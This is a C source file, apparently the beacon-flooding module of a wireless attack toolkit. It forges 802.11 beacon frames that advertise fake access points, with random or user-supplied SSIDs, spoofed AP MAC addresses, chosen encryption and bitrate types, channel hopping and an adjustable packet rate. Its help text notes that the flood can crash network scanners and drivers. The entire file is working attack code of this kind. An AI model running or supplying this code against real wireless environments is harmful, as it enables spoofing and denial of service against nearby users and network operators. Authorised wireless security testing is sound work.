#include <stdio.h>
#include <string.h>
#include <inttypes.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>

#include "beacon_flood.h"
#include "../osdep.h"
#include "../helpers.h"

#define BEACON_FLOOD_MODE 'b'
#define BEACON_FLOOD_NAME "Beacon Flooding"

struct beacon_flood_options {
  char *ssid;
  char *ssid_filename;
  char *mac_ssid_filename;
  unsigned char type;
  char encryptions[5];
  char bitrates;
  unsigned char validapmac;
  unsigned char hopto;
  uint8_t channel;
  unsigned int speed;
};

//Global things, shared by packet creation and stats printing
char *ssid = NULL;
struct ether_addr bssid;
int curchan = 0;

void beacon_flood_shorthelp()
{
  printf("  Sends beacon frames to show fake APs at clients.\n");
  printf("  This can sometimes crash network scanners and even drivers!\n");
}

void beacon_flood_longhelp()
{
  printf( "      Sends beacon frames to generate fake APs at clients.\n"
	  "      This can sometimes crash network scanners and drivers!\n"
	  "      OPTIONS:\n"
	  "      -n <ssid>\n"
	  "         Use SSID <ssid> instead of randomly generated ones\n"
	  "      -f <filename>\n"
	  "         Read SSIDs from file\n"
	  "      -v <filename>\n"
	  "         Read MACs and SSIDs from file. See example file!\n"
	  "      -t <adhoc>\n"
	  "         -t 1 = Create only Ad-Hoc network\n"
	  "         -t 0 = Create only Managed (AP) networks\n"
	  "         without this option, both types are generated\n"
	  "      -w <encryptions>\n"
	  "         Select which type of encryption the fake networks shall have\n"
	  "         Valid options: n = No Encryption, w = WEP, t = TKIP (WPA), a = AES (WPA2)\n"
	  "         You can select multiple types, i.e. \"-w wta\" will only create WEP and WPA networks\n" 
	  "      -b <bitrate>\n"
	  "         Select if 11 Mbit (b) or 54 MBit (g) networks are created\n"
	  "         Without this option, both types will be used.\n"
	  "      -m\n"
	  "         Use valid accesspoint MAC from built-in OUI database\n"
	  "      -h\n"
	  "         Hop to channel where network is spoofed\n"
	  "         This is more effective with some devices/drivers\n"
	  "         But it reduces packet rate due to channel hopping.\n"
	  "      -c <chan>\n"
	  "         Create fake networks on channel <chan>. If you want your card to\n"
	  "         hop on this channel, you have to set -h option, too.\n"
	  "      -s <pps>\n"
	  "         Set speed in packets per second (Default: 50)\n");
}

void *beacon_flood_parse(int argc, char *argv[]) {
  int opt, ch;
  unsigned int i;
  struct beacon_flood_options *bopt = malloc(sizeof(struct beacon_flood_options));
  
  bopt->ssid = NULL;
  bopt->ssid_filename = NULL;
  bopt->mac_ssid_filename = NULL;
  bopt->type = 2;
  strcpy(bopt->encryptions, "nwta");
  bopt->bitrates = 'a';
  bopt->validapmac = 0;
  bopt->hopto = 0;
  bopt->channel = 0;
  bopt->speed = 50;
  
  while ((opt = getopt(argc, argv, "n:f:v:t:w:b:mhc:s:")) != -1) {
    switch (opt) {
      case 'n':
	if (strlen(optarg) > 255) {
	  printf("ERROR: SSID too long\n"); return NULL;
	} else if (strlen(optarg) > 32) {
	  printf("NOTE: Using Non-Standard SSID with length > 32\n");
	}
	if (bopt->ssid_filename || bopt->mac_ssid_filename) {
	  printf("Only one of -n -f or -v may be selected\n"); return NULL; }
	bopt->ssid = malloc(strlen(optarg) + 1); strcpy(bopt->ssid, optarg);
      break;
      case 'f':
	if (bopt->ssid || bopt->mac_ssid_filename) {
	  printf("Only one of -n -f or -v may be selected\n"); return NULL; }
	bopt->ssid_filename = malloc(strlen(optarg) + 1); strcpy(bopt->ssid_filename, optarg);
      break;
      case 'v':
	if (bopt->ssid_filename || bopt->ssid) {
	  printf("Only one of -n -f or -v may be selected\n"); return NULL; }
	bopt->mac_ssid_filename = malloc(strlen(optarg) + 1); strcpy(bopt->mac_ssid_filename, optarg);
      break;
      case 't':
	if (! strcmp(optarg, "1")) bopt->type = 1;
	else if (! strcmp(optarg, "0")) bopt->type = 0;
	else { beacon_flood_longhelp(); printf("\n\nInvalid -t option\n"); return NULL; }
      break;
      case 'w':
	if ((strlen(optarg) > 4) || (strlen(optarg) < 1)) {
	  beacon_flood_longhelp(); printf("\n\nInvalid -w option\n"); return NULL; }
	for(i=0; i<strlen(optarg); i++) {
	  if ((optarg[i] != 'w') && (optarg[i] != 'n') && (optarg[i] != 't') && (optarg[i] != 'a')) {
	    beacon_flood_longhelp(); printf("\n\nInvalid -w option\n"); return NULL; }
	}
	memset(bopt->encryptions, 0x00, 5);
	strcpy(bopt->encryptions, optarg);
      break;
      case 'b':
	if (! strcmp(optarg, "b")) bopt->bitrates = 'b';
	else if (! strcmp(optarg, "g")) bopt->bitrates = 'g';
	else { beacon_flood_longhelp(); printf("\n\nInvalid -b option\n"); return NULL; }
      break;
      case 'm':
	bopt->validapmac = 1;
      break;
      case 'h':
	bopt->hopto = 1;
      break;
      case 'c':
	ch = atoi(optarg);
	if ((ch < 1) || (ch > 165)) { printf("\n\nInvalid channel\n"); return NULL; }
	bopt->channel = (uint8_t) ch;
      break;
      case 's':
	bopt->speed = (unsigned int) atoi(optarg);
      break;
      default:
	beacon_flood_longhelp();
	printf("\n\nUnknown option %c\n", opt);
	return NULL;
    }
  }
  
  return (void *) bopt;
}


struct packet beacon_flood_getpacket(void *options) {
  struct beacon_flood_options *bopt = (struct beacon_flood_options *) options;
  struct packet pkt;
  static unsigned int packsent = 0, encindex;
  static time_t t_prev = 0;
  static int freessid = 0;
  unsigned char bitrate, adhoc;
  
  if (bopt->hopto) {
    packsent++;
    if ((packsent == 50) || ((time(NULL) - t_prev) >= 3)) {
      // Switch Channel every 50 frames or 3 seconds
      packsent = 0; t_prev = time(NULL);
      if (bopt->channel) curchan = (int) bopt->channel;
      else curchan = (int) generate_channel();
      osdep_set_channel(curchan);
    }
  } else {
    curchan = (int) generate_channel();
  }
  
/*  
  bopt->ssid = NULL;
  bopt->ssid_filename = NULL;
  bopt->mac_ssid_filename = NULL;
  bopt->type = 2;
  strcpy(bopt->encryptions, "nwta");
  bopt->bitrates = 'a';
  bopt->validapmac = 0;
  bopt->hopto = 0;
  bopt->channel = 0;
  bopt->speed = 50;*/

  if (bopt->validapmac) bssid = generate_mac(MAC_KIND_AP);
  else bssid = generate_mac(MAC_KIND_RANDOM);

  if (freessid && ssid) free(ssid);
  if (bopt->ssid) {
    ssid = bopt->ssid;
  } else if (bopt->ssid_filename) {
    do { ssid = read_next_line(bopt->ssid_filename, 0); } while (ssid == NULL);
    freessid = 1;
  } else if (bopt->mac_ssid_filename) {
    printf("Not implemented: mac + ssid files\n");
    exit(-1);
  } else {
    ssid = generate_ssid();
    freessid = 1;
  }
  
  encindex = random() % strlen(bopt->encryptions);
  
  if (bopt->bitrates == 'a') {
    if (random() % 2) bitrate = 11;
    else bitrate = 54;
  } else if (bopt->bitrates == 'b') {
    bitrate = 11;
  } else {
    bitrate = 54;
  }
  
  if (bopt->type == 2) {
    if (random() % 2) adhoc = 0;
    else adhoc = 1;
  } else if (bopt->type == 1) {
    adhoc = 1;
  } else {
    adhoc = 0;
  }
  
  pkt = create_beacon(bssid, ssid, (uint8_t) curchan, bopt->encryptions[encindex], bitrate, adhoc);
  
  usleep(pps2usec(bopt->speed));
  return pkt;
}

void beacon_flood_print_stats(void *options) {
  options = options; //Avoid unused warning
  printf("\rCurrent MAC: "); print_mac(bssid);
  printf(" on Channel %2d with SSID: %s\n", curchan, ssid);
}

struct attacks load_beacon_flood() {
  struct attacks this_attack;
  char *beacon_flood_name = malloc(strlen(BEACON_FLOOD_NAME) + 1);
  strcpy(beacon_flood_name, BEACON_FLOOD_NAME);

  this_attack.print_shorthelp = (fp) beacon_flood_shorthelp;
  this_attack.print_longhelp = (fp) beacon_flood_longhelp;
  this_attack.parse_options = (fpo) beacon_flood_parse;
  this_attack.get_packet = (fpp) beacon_flood_getpacket;
  this_attack.print_stats = (fps) beacon_flood_print_stats;
  this_attack.mode_identifier = BEACON_FLOOD_MODE;
  this_attack.attack_name = beacon_flood_name;

  return this_attack;
}